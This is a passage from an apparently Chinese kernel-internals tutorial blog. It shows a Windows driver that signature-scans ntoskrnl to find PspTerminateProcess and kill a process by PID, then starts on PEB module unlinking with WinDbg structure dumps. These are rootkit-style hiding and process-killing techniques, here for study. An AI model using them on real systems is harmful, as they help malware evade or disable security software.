&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">( IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG ulShellCode[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x0124a164</span>, <span class="number">0x758b0000</span>, <span class="number">0x44703b08</span>, <span class="number">0x0db80775</span>,</span><br><span class="line">		<span class="number">0xebc00000</span>, <span class="number">0xbe8d575a</span>, <span class="number">0x00000248</span>, <span class="number">0x200147f6</span>,</span><br><span class="line">		<span class="number">0x868d1274</span>, <span class="number">0x00000174</span></span><br><span class="line">	&#125;;</span><br><span class="line">	ULONG ulRet = <span class="number">0</span>;</span><br><span class="line">	PVOID DllBase = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG SizeOfImage = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*_PspTerminateProcess)</span><span class="params">(PEPROCESS pEprocess, NTSTATUS ExitCode)</span></span>;</span><br><span class="line">	_PspTerminateProcess PspTerminateProcess;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ulRet = GetKernelMoudleInfo(driver,&amp;DllBase,&amp;SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!ulRet)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;驱动程序获取ntoskrnl.exe模块失败.\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	PspTerminateProcess = (_PspTerminateProcess)Find_FeatureCode((PVOID)ulShellCode,<span class="keyword">sizeof</span>(ulShellCode),DllBase,SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!PspTerminateProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;PspTerminateProcess特征码搜索失败.\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PsLookupProcessByProcessId((HANDLE)<span class="number">2796</span>,&amp;pEprocess); <span class="comment">// 记事本PID是2796</span></span><br><span class="line">	PspTerminateProcess(pEprocess, <span class="number">0</span>);</span><br><span class="line">	DbgPrint(<span class="string">&quot;记事本进程被 PspTerminateProcess 函数关闭了.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ULONG <span class="title">GetKernelMoudleInfo</span><span class="params">(IN PDRIVER_OBJECT pDriver,OUT PVOID* DllBase,OUT PULONG SizeOfImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Head = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Tail = <span class="literal">NULL</span>;</span><br><span class="line">	UNICODE_STRING UnicodeMoudleName = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	</span><br><span class="line">	RtlInitUnicodeString(&amp;UnicodeMoudleName,<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pLDR_Head = (PLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class="line">	pLDR_Tail = pLDR_Head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(RtlCompareUnicodeString(&amp;pLDR_Tail-&gt;BaseDllName, &amp;UnicodeMoudleName, TRUE) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			*DllBase = pLDR_Tail-&gt;DllBase;</span><br><span class="line">			*SizeOfImage = pLDR_Tail-&gt;SizeOfImage;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//pLDR_Blink = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(pLDR_Flink,LDR_DATA_TABLE_ENTRY,InLoadOrderLinks);</span></span><br><span class="line">		pLDR_Tail = (PLDR_DATA_TABLE_ENTRY)pLDR_Tail-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(pLDR_Head != pLDR_Tail);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PVOID <span class="title">Find_FeatureCode</span><span class="params">(PVOID pShellCode,ULONG ulShellCode_Len,PVOID DllBase,ULONG ulSizeOfImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG ulDllLastByte = <span class="number">0</span>;</span><br><span class="line">	PVOID pNextByte = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pNextByte = DllBase;</span><br><span class="line">	ulDllLastByte = (ULONG)DllBase + ulSizeOfImage;</span><br><span class="line">	<span class="keyword">while</span>((ULONG)pNextByte + ulShellCode_Len &lt;= ulDllLastByte)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(RtlCompareMemory(pNextByte,pShellCode,ulShellCode_Len) == ulShellCode_Len)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> (PVOID)((ULONG)pNextByte - <span class="number">6</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		pNextByte = (PVOID)((ULONG)pNextByte + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/16/Qy9u7DbM6IaWSNc.png" alt="17.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/16/X31Hsk95gCy7Qb8.png" alt="18.png"></p>
<h2 id="3-3环PEB断链"><a href="#3-3环PEB断链" class="headerlink" title="3 3环PEB断链"></a>3 3环PEB断链</h2><p>TEB：线程环境块，每个线程都有这么一块内存存储信息来描述当前线程的信息，<mark class="label warning">fs:[0]</mark>指向TEB。</p>
<p>PEB：进程环境块，TEB偏移0x30就是PEB，即<mark class="label success">fs:[0x30]</mark>。</p>
<p>PEB、TEB是3环的，都是3环的内存，在3环就可读取。<strong>FS段寄存器在3环和0环的含义不一样</strong>。</p>
<div class="note primary"><p><strong>fs:[0]：</strong>TEB --&gt; <strong>fs:[0x30]：</strong>PEB  --&gt; <strong>PEB+0xC</strong>：PEB_LDR_DATA --&gt; <strong>PEB_LDR_DATA+0xC</strong>：LDR_DATA_TABLE_ENTRY</p>
</div>

<p>示意图如下：具体可以参考：《<a href="https://www.cnblogs.com/bokernb/p/6404795.html">PEB及LDR链</a><a href="https://www.cnblogs.com/bokernb/p/6404795.html">PEB及LDR链</a>》</p>
<p><img data-src="https://s2.loli.net/2022/01/20/JKsiP5R6Qz8nM1t.png" alt="19.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/17/wBxzcRrdjIWhe9l.jpg" alt="20.jpeg"></p>
<p>⚠️<strong>注意</strong>：这里的<code>LDR_DATA_TABLE_ENTRY</code>是3环的，在3环通过该结构只能够列举该进程在3环加载的所有模块。</p>
<h3 id="3-1-TEB、PEB"><a href="#3-1-TEB、PEB" class="headerlink" title="3.1 TEB、PEB"></a>3.1 TEB、PEB</h3><p><strong>一、TEB</strong></p>
<p>段寄存器FS（<mark class="label primary">fs:[0]</mark>）<strong>存的值指向TEB结构</strong>，在OD中可以看到3环下FS的值（<code>0x7FFDF000</code>）和对应的段选择子（<code>0x3B</code>）。</p>
<p>查看当前进程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span></span><br><span class="line">**** NT ACTIVE PROCESS DUMP ****</span><br><span class="line">  PROCESS <span class="number">861969f</span>8  SessionId: <span class="number">0</span>  Cid: <span class="number">0924</span>    Peb: <span class="number">7f</span>fd9000  ParentCid: <span class="number">0688</span></span><br><span class="line">    DirBase: <span class="number">06e401</span>c0  ObjectTable: e1e919e8  HandleCount:  <span class="number">74.</span></span><br><span class="line">    Image: ollydbg.exe</span><br><span class="line"></span><br><span class="line">PROCESS <span class="number">861e1020</span>  SessionId: <span class="number">0</span>  Cid: <span class="number">0970</span>    Peb: <span class="number">7f</span>fda000  ParentCid: <span class="number">0b</span>54</span><br><span class="line">    DirBase: <span class="number">06e40320</span>  ObjectTable: e1473788  HandleCount:  <span class="number">12.</span></span><br><span class="line">    Image: <span class="number">0119</span>_PEB.exe</span><br></pre></td></tr></table></figure>

<p>切换到当前进程空间：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; .process <span class="number">861e1020</span></span><br><span class="line">Implicit process is now <span class="number">861e1020</span></span><br><span class="line">WARNING: .cache forcedecodeuser is <span class="keyword">not</span> enabled</span><br></pre></td></tr></table></figure>

<p>TEB结构为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _TEB <span class="number">0x7FFDF000</span></span><br><span class="line">nt!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : (null) </span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : (null) </span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : (null) </span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : <span class="number">0x7ffdd000</span> _PEB</span><br><span class="line">   +<span class="number">0x034</span> LastErrorValue   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> CountOfOwnedCriticalSections : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x03c</span> CsrClientThread  : (null) </span><br><span class="line">   +<span class="number">0x040</span> Win32ThreadInfo  : (null) </span><br><span class="line">   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0c0</span> WOW32Reserved    : (null) </span><br><span class="line">   +<span class="number">0x0c4</span> CurrentLocale    : <span class="number">0x804</span></span><br><span class="line">   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0cc</span> SystemReserved1  : [<span class="number">54</span>] (null) </span><br><span class="line">   +<span class="number">0x1a4</span> ExceptionCode    : <span class="number">0</span>n0</span><br><span class="line">   +<span class="number">0x1a8</span> ActivationContextStack : _ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x1bc</span> SpareBytes1      : [<span class="number">24</span>]  <span class="string">&quot;&quot;</span></span><br><span class="line">   +<span class="number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH</span><br><span class="line">   +<span class="number">0x6b4</span> RealClientId     : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x6bc</span> GdiCachedProcessHandle : (null) </span><br><span class="line">   +<span class="number">0x6c0</span> GdiClientPID     : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x6c4</span> GdiClientTID     : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x6c8</span> GdiThreadLocalInfo : (null) </span><br><span class="line">   +<span class="number">0x6cc</span> Win32ClientInfo  : [<span class="number">62</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x7c4</span> glDispatchTable  : [<span class="number">233</span>] (null) </span><br><span class="line">   +<span class="number">0xb68</span> glReserved1      : [<span class="number">29</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0xbdc</span> glReserved2      : (null) </span><br><span class="line">   +<span class="number">0xbe0</span> glSectionInfo    : (null) </span><br><span class="line">   +<span class="number">0xbe4</span> glSection        : (null) </span><br><span class="line">   +<span class="number">0xbe8</span> glTable          : (null) </span><br><span class="line">   +<span class="number">0xbec</span> glCurrentRC      : (null) </span><br><span class="line">   +<span class="number">0xbf0</span> glContext        : (null) </span><br><span class="line">   +<span class="number">0xbf4</span> LastStatusValue  : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING <span class="string">&quot;kernel32.dll&quot;</span></span><br><span class="line">   +<span class="number">0xc00</span> StaticUnicodeBuffer : [<span class="number">261</span>] <span class="number">0x6b</span></span><br><span class="line">   +<span class="number">0xe0c</span> DeallocationStack : <span class="number">0x00030000</span> Void</span><br><span class="line">   +<span class="number">0xe10</span> TlsSlots         : [<span class="number">64</span>] (null) </span><br><span class="line">   +<span class="number">0xf10</span> TlsLinks         : _LIST_ENTRY [ <span class="number">0x0</span> - <span class="number">0x0</span> ]</span><br><span class="line">   +<span class="number">0xf18</span> Vdm              : (null) </span><br><span class="line">   +<span class="number">0xf1c</span> ReservedForNtRpc : (null) </span><br><span class="line">   +<span class="number">0xf20</span> DbgSsReserved    : [<span class="number">2</span>] (null) </span><br><span class="line">   +<span class="number">0xf28</span> HardErrorsAreDisabled : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf2c</span> Instrumentation  : [<span class="number">16</span>] (null) </span><br><span class="line">   +<span class="number">0xf6c</span> WinSockData      : (null) </span><br><span class="line">   +<span class="number">0xf70</span> GdiBatchCount    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf74</span> InDbgPrint       : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0xf75 FreeStackOnTermination : 0 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0xf76</span> HasFiberData     : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0xf77 IdealProcessor   : 0 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0xf78</span> Spare3           : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf7c</span> ReservedForPerf  : (null) </span><br><span class="line">   +<span class="number">0xf80</span> ReservedForOle   : (null) </span><br><span class="line">   +<span class="number">0xf84</span> WaitingOnLoaderLock : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf88</span> Wx86Thread       : _Wx86ThreadState</span><br><span class="line">   +<span class="number">0xf94</span> TlsExpansionSlots : (null) </span><br><span class="line">   +<span class="number">0xf98</span> ImpersonationLocale : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xf9c</span> IsImpersonating  : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xfa0</span> NlsCache         : (null) </span><br><span class="line">   +<span class="number">0xfa4</span> pShimData        : (null) </span><br><span class="line">   +<span class="number">0xfa8</span> HeapVirtualAffinity : <span class="number">0</span></span><br><span class="line">   +<span class="number">0xfac</span> CurrentTransactionHandle : (null) </span><br><span class="line">   +<span class="number">0xfb0</span> ActiveFrame      : (null) </span><br><span class="line">   +<span class="number">0xfb4</span> SafeThunkCall    : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0xfb5 BooleanSpare     : [3]  &quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>二、PEB结构</strong></p>
<p>由TEB结构可以看到偏移<code>0x30</code>处即指向PEB（<mark class="label danger">fs:[0x30]</mark>），即为<code>0x7ffdd000</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _PEB <span class="number">0x7ffdd000</span></span><br><span class="line">nt!_PEB</span><br><span class="line">   +<span class="number">0x000</span> InheritedAddressSpace : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0x002</span> BeingDebugged    : <span class="number">0x1</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x003 SpareBool        : 0 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0x004</span> Mutant           : <span class="number">0xffffffff</span> Void</span><br><span class="line">   +<span class="number">0x008</span> ImageBaseAddress : <span class="number">0x00400000</span> Void</span><br><span class="line">   +<span class="number">0x00c</span> Ldr              : <span class="number">0x00241ea0</span> _PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x010</span> ProcessParameters : <span class="number">0x00020000</span> _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +<span class="number">0x014</span> SubSystemData    : (null) </span><br><span class="line">   +<span class="number">0x018</span> ProcessHeap      : <span class="number">0x00140000</span> Void</span><br><span class="line">   +<span class="number">0x01c</span> FastPebLock      : <span class="number">0x7c99d600</span> _RTL_CRITICAL_SECTION</span><br><span class="line">   +<span class="number">0x020</span> FastPebLockRoutine : <span class="number">0x7c921000</span> Void</span><br><span class="line">   +<span class="number">0x024</span> FastPebUnlockRoutine : <span class="number">0x7c9210e0</span> Void</span><br><span class="line">   +<span class="number">0x028</span> EnvironmentUpdateCount : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x02c</span> KernelCallbackTable : (null) </span><br><span class="line">   +<span class="number">0x030</span> SystemReserved   : [<span class="number">1</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x034</span> AtlThunkSListPtr32 : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> FreeList         : (null) </span><br><span class="line">   +<span class="number">0x03c</span> TlsExpansionCounter : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x040</span> TlsBitmap        : <span class="number">0x7c99d5c0</span> Void</span><br><span class="line">   +<span class="number">0x044</span> TlsBitmapBits    : [<span class="number">2</span>] <span class="number">1</span></span><br><span class="line">   +<span class="number">0x04c</span> ReadOnlySharedMemoryBase : <span class="number">0x7f6f0000</span> Void</span><br><span class="line">   +<span class="number">0x050</span> ReadOnlySharedMemoryHeap : <span class="number">0x7f6f0000</span> Void</span><br><span class="line">   +<span class="number">0x054</span> ReadOnlyStaticServerData : <span class="number">0x7f6f0688</span>  -&gt; (null) </span><br><span class="line">   +<span class="number">0x058</span> AnsiCodePageData : <span class="number">0x7ffa0000</span> Void</span><br><span class="line">   +<span class="number">0x05c</span> OemCodePageData  : <span class="number">0x7ffa0000</span> Void</span><br><span class="line">   +<span class="number">0x060</span> UnicodeCaseTableData : <span class="number">0x7ffd1000</span> Void</span><br><span class="line">   +<span class="number">0x064</span> NumberOfProcessors : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x068</span> NtGlobalFlag     : <span class="number">0x70</span></span><br><span class="line">   +<span class="number">0x070</span> CriticalSectionTimeout : _LARGE_INTEGER <span class="number">0xffffe86d</span>`<span class="number">079b</span>8000</span><br><span class="line">   +<span class="number">0x078</span> HeapSegmentReserve : <span class="number">0x100000</span></span><br><span class="line">   +<span class="number">0x07c</span> HeapSegmentCommit : <span class="number">0x2000</span></span><br><span class="line">   +<span class="number">0x080</span> HeapDeCommitTotalFreeThreshold : <span class="number">0x10000</span></span><br><span class="line">   +<span class="number">0x084</span> HeapDeCommitFreeBlockThreshold : <span class="number">0x1000</span></span><br><span class="line">   +<span class="number">0x088</span> NumberOfHeaps    : <span class="number">4</span></span><br><span class="line">   +<span class="number">0x08c</span> MaximumNumberOfHeaps : <span class="number">0x10</span></span><br><span class="line">   +<span class="number">0x090</span> ProcessHeaps     : <span class="number">0x7c99cfc0</span>  -&gt; <span class="number">0x00140000</span> Void</span><br><span class="line">   +<span class="number">0x094</span> GdiSharedHandleTable : (null) </span><br><span class="line">   +<span class="number">0x098</span> ProcessStarterHelper : (null) </span><br><span class="line">   +<span class="number">0x09c</span> GdiDCAttributeList : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0a0</span> LoaderLock       : <span class="number">0x7c99b178</span> Void</span><br><span class="line">   +<span class="number">0x0a4</span> OSMajorVersion   : <span class="number">5</span></span><br><span class="line">   +<span class="number">0x0a8</span> OSMinorVersion   : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x0ac</span> OSBuildNumber    : <span class="number">0xa28</span></span><br><span class="line">   +<span class="number">0x0ae</span> OSCSDVersion     : <span class="number">0x300</span></span><br><span class="line">   +<span class="number">0x0b0</span> OSPlatformId     : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x0b4</span> ImageSubsystem   : <span class="number">3</span></span><br><span class="line">   +<span class="number">0x0b8</span> ImageSubsystemMajorVersion : <span class="number">4</span></span><br><span class="line">   +<span class="number">0x0bc</span> ImageSubsystemMinorVersion : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0c0</span> ImageProcessAffinityMask : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0c4</span> GdiHandleBuffer  : [<span class="number">34</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x14c</span> PostProcessInitRoutine : (null) </span><br><span class="line">   +<span class="number">0x150</span> TlsExpansionBitmap : <span class="number">0x7c99d5b8</span> Void</span><br><span class="line">   +<span class="number">0x154</span> TlsExpansionBitmapBits : [<span class="number">32</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x1d4</span> SessionId        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x1d8</span> AppCompatFlags   : _ULARGE_INTEGER <span class="number">0x0</span></span><br><span class="line">   +<span class="number">0x1e0</span> AppCompatFlagsUser : _ULARGE_INTEGER <span class="number">0x0</span></span><br><span class="line">   +<span class="number">0x1e8</span> pShimData        : (null) </span><br><span class="line">   +<span class="number">0x1ec</span> AppCompatInfo    : (null) </span><br><span class="line">   +<span class="number">0x1f0</span> CSDVersion       : _UNICODE_STRING <span class="string">&quot;Service Pack 3&quot;</span></span><br><span class="line">   +<span class="number">0x1f8</span> ActivationContextData : (null) </span><br><span class="line">   +<span class="number">0x1fc</span> ProcessAssemblyStorageMap : (null) </span><br><span class="line">   +<span class="number">0x200</span> SystemDefaultActivationContextData : <span class="number">0x00130000</span> Void</span><br><span class="line">   +<span class="number">0x204</span> SystemAssemblyStorageMap : (null) </span><br><span class="line">   +<span class="number">0x208</span> MinimumStackCommit : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>三、PEB_LDR_DATA结构</strong>，该结构的<code>LIST_ENTRY</code>即为模块。</p>
<div class="note info"><ul>
<li>PEB_LDR_DATA结构：<mark class="label danger">该结构的<code>LIST_ENTRY</code>即为模块</mark>。</li>
<li>_LDR_DATA_TABLE_ENTRY结构：<mark class="label default">该结构为模块的详细信息</mark>。</li>
</ul>
</div>

<p>在PEB偏移<code>0xC</code>得位置指向LDR链，LDR结构为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    +<span class="number">0x00</span>	ULONG Length;</span><br><span class="line">    +<span class="number">0x04</span>	BOOLEAN Initialized;</span><br><span class="line">    +<span class="number">0x08</span>	PVOID SsHandle;</span><br><span class="line">    +<span class="number">0x0c</span>	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    +<span class="number">0x14</span>	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    +<span class="number">0x1c</span>	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    +<span class="number">0x24</span>	PVOID EntryInProgress; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br></pre></td></tr></table></figure>

<p>其中<code>InLoadOrderModuleList</code>、<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code>为三个双向链表结构：</p>
<ul>
<li><code>InLoadOrderModuleList</code>： 模块加载顺序</li>
<li><code>InMemoryOrderModuleList</code> ：加载后在内存中的顺序</li>
<li><code>InInitializationOrderModuleList</code> ：模块初始化的顺序</li>
</ul>
<p>指向的结构为：**_LDR_DATA_TABLE_ENTRY**，该结构为模块的详细信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          LIST_ENTRY HashLinks;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               PVOID SectionPointer;</span><br><span class="line">               ULONG CheckSum;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG TimeDateStamp;</span><br><span class="line">          PVOID LoadedImports;</span><br><span class="line">     &#125;;</span><br><span class="line">     _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">     PVOID PatchInformation;</span><br><span class="line">     LIST_ENTRY ForwarderLinks;</span><br><span class="line">     LIST_ENTRY ServiceTagLinks;</span><br><span class="line">     LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<ul>
<li>在3环：使用了<code>InLoadOrderLinks</code>，使用<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code>这三个链表。</li>
<li>在0环：<code>_LDR_DATA_TABLE_ENTRY</code>中只使用了<code>InLoadOrderLinks</code>，并没有使用<code>InMemoryOrderModuleList</code>、<code>InInitializationOrderModuleList</code>这两个链表。</li>
</ul>
<p>使用如下方法查看：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _PEB_LDR_DATA <span class="number">0x00241ea0</span></span><br><span class="line">nt!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : <span class="number">0x28</span></span><br><span class="line">   +<span class="number">0x004</span> Initialized      : <span class="number">0x1</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x008 SsHandle         : (null) </span><br><span class="line">   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY [ <span class="number">0x241ee0</span> - <span class="number">0x242010</span> ]</span><br><span class="line">   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY [ <span class="number">0x241ee8</span> - <span class="number">0x242018</span> ]</span><br><span class="line">   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY [ <span class="number">0x241f58</span> - <span class="number">0x242020</span> ]</span><br><span class="line">   +<span class="number">0x024</span> EntryInProgress  : (null) </span><br></pre></td></tr></table></figure>

<p><code>[ 0x241ee0 - 0x242010 ]</code>分别为：Flink（当前模块）与Blink（上一个模块）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _LDR_DATA_TABLE_ENTRY <span class="number">0x241ee0</span> </span><br><span class="line">nt!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x241f48</span> - <span class="number">0x241eac</span> ]</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x241f50</span> - <span class="number">0x241eb4</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x0</span> - <span class="number">0x0</span> ]</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : <span class="number">0x00400000</span> Void</span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : <span class="number">0x00401190</span> Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : <span class="number">0x2c000</span></span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;C:\Documents and Settings\A1v1n\桌面\VC6\Microsoft Visual Studio\MyProjects\0119_PEB\Debug\0119_PEB.exe&quot;</span></span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;0119_PEB.exe&quot;</span></span><br><span class="line">   +<span class="number">0x034</span> Flags            : <span class="number">0x5000</span></span><br><span class="line">   +<span class="number">0x038</span> LoadCount        : <span class="number">0xffff</span></span><br><span class="line">   +<span class="number">0x03a</span> TlsIndex         : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x03c</span> HashLinks        : 